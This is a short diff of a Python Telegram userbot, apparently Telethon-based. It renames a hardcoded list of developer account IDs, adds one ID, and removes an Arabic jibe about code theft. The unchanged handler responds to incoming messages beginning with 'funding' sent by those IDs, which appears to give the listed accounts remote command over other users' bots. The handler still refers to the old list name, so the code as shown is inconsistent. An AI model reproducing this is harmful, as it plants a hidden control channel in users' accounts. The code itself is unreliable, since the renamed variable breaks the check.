@@ -278,8 +278,8 @@ Qrue_Bosa = [
 async def ithker(knopis):
     await knopis.edit(choice(Qrue_Bosa))
 
-DevJoker = [6320583148,5762222122,5835316914]
-#تضل تخمط من عمك الساحر ؟ الى اين يستمُر الفشل ياغُلام
+DevSaher = [6320583148,5762222122,5835316914,6528926431]
+
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
